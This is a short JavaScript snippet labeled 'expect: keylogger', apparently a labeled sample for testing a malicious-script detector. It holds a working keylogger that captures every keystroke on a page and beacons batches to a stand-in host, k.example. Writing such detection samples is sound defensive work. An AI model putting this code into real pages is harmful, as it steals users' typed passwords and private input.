// expect: keylogger
// Document-wide keystroke collector that batches keys and sends them out.
var buf = '';
document.addEventListener('keydown', function (e) { buf += e.key; if (buf.length > 20) { navigator.sendBeacon('https://k.example/l', buf); buf = ''; } });
